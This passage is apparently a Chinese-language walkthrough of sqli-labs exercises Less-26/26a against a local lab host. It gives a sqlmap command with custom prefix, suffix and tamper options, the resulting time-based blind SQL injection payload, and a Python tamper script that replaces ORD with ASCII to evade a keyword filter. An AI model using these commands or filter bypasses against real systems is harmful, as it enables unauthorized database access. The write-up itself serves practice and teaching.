这个时候使用sqlmap其实作用已经不大了，毕竟工具是死的，手工编写一些脚本可能更加有效。



想要修改的话可以修改源码，参考上面的sqlmap自定义去添加自定义payload比较好

由于空格过滤后别的字符又无法解析，所以这里将空格过滤注释掉后可以成功注入





## less26

```sh
 sqlmap -u http://192.168.133.162/sql/Less-26a/index.php?id=1  --dbs --thread 5 --tamper "symboliclogical.py" --prefix "')<>(" --suffix ")<>('1"  --batch -v 3  --tables -D "security" --level 3
```



```sh
---
Parameter: id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace
    Payload: id=')<>((CASE WHEN (1221=1221) THEN SLEEP(5) ELSE 1221 END))<>('1
    Vector: (CASE WHEN ([INFERENCE]) THEN SLEEP([SLEEPTIME]) ELSE [RANDNUM] END)
---

```

能够成功检测出注入，但是ord因为有or所以被过滤掉了

如果将ord换成ascii即可绕过

编写tamper

```python
#!/usr/bin/env python
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.LOW

def tamper(payload, **kwargs):
    if payload:
        bypass_str = "ascii"
        payload=payload.replace("ORD",bypass_str)
    return payload
```





## less27